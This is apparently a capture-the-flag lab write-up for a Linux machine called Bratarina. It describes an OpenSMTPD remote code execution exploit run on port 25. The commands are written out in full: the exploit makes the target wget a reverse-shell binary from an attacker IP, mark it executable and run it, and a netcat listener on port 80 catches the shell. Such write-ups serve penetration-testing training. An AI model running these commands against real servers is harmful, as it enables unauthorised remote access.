# üè¥ Bratarina (Linux)

## üß† Initial Foothold

- Identified port 25 open, running **OpenSMTPD**.

- Used Searchsploit to find vulnerabilities and selected exploit `47984.py`.

- Uploaded a reverse shell payload to `/tmp` with:
  ```bash
  python3 47984.py 192.168.102.71 25 "wget 192.168.45.229/revshell.elf -O /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "chmod +x /tmp/revshell.elf"
  python3 47984.py 192.168.102.71 25 "/tmp/revshell.elf"
  ```

- üî• **Important:** The reverse shell must connect back on **port 80** (other ports did not work).

- Started a listener with:
  ```bash
  nc -nlvp 80
  ```

- Successfully received a shell.

## üöÄ Privilege Escalation

- üü¢ **No further privilege escalation was required**, as the shell provided sufficient access.
